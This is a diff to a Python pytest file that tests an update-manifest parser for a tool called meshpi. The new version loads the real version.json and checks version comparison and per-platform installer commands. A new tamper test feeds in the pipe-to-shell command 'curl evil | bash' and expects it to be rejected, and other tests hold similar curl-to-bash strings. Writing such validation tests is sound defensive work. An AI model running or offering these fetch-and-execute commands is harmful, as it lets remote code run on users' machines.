@@ -1,45 +1,41 @@
+import json
+from pathlib import Path
+
 import pytest
 
 from meshpi.update import UpdateCheckError, parse_update_manifest, platform_key
 
+ROOT = Path(__file__).resolve().parents[1]
 
-def manifest(version="0.4.0"):
-    return {
-        "schema_version": 1,
-        "latest_version": version,
-        "release_notes_url": "https://venes.org/meshpi/#release-notes",
-        "installers": {
-            "linux": {"update_command": "curl linux | sudo bash"},
-            "macos": {"update_command": "curl macos | bash"},
-            "windows": {"update_command": "powershell update"},
-        },
-    }
+
+def manifest():
+    return json.loads((ROOT / "website" / "version.json").read_text(encoding="utf-8"))
 
 
 def test_update_manifest_selects_platform_command():
     notice = parse_update_manifest(
         manifest(),
-        current_version="0.3.2",
+        current_version="0.5.2",
         platform_name="win32",
     )
     assert notice is not None
-    assert notice.latest_version == "0.4.0"
-    assert notice.command == "powershell update"
+    assert notice.latest_version == "0.5.3"
+    assert notice.command.endswith(".\\install-windows.ps1")
 
 
 def test_update_manifest_returns_none_for_current_or_newer_version():
     assert (
         parse_update_manifest(
-            manifest("0.4.0"),
-            current_version="0.4.0",
+            manifest(),
+            current_version="0.5.3",
             platform_name="linux",
         )
         is None
     )
     assert (
         parse_update_manifest(
-            manifest("0.3.9"),
-            current_version="0.4.0",
+            manifest(),
+            current_version="0.5.4",
             platform_name="linux",
         )
         is None
@@ -50,13 +46,18 @@ def test_update_manifest_rejects_multiline_command_and_bad_version():
     value = manifest()
     value["installers"]["linux"]["update_command"] = "curl example\nbash"
     with pytest.raises(UpdateCheckError):
-        parse_update_manifest(value, current_version="0.3.2", platform_name="linux")
+        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")
     with pytest.raises(UpdateCheckError):
-        parse_update_manifest(
-            manifest("latest"),
-            current_version="0.3.2",
-            platform_name="linux",
-        )
+        value = manifest()
+        value["latest_version"] = "latest"
+        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")
+
+
+def test_update_manifest_rejects_tampering():
+    value = manifest()
+    value["installers"]["linux"]["update_command"] = "curl evil | bash"
+    with pytest.raises(UpdateCheckError):
+        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")
 
 
 def test_platform_key():
